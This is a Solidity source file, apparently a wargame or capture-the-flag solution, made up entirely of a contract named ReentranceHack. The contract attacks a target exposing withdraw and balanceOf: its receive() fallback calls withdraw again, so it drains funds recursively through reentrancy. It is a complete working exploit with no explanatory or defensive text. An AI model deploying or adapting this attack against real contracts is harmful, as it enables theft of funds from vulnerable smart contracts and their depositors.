// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
    function withdraw(uint256 _amount) external;
    function balanceOf(address _who) external view returns (uint256 balance);
}

contract ReentranceHack {

    IReentrance cont;

    constructor(IReentrance _cont) public {
        cont = _cont;
    }

    function withdraw() public {
        uint256 balance = cont.balanceOf(address(this));
        if (balance > 0)
            cont.withdraw(balance);
    }

    receive() external payable {
        this.withdraw();
    }
}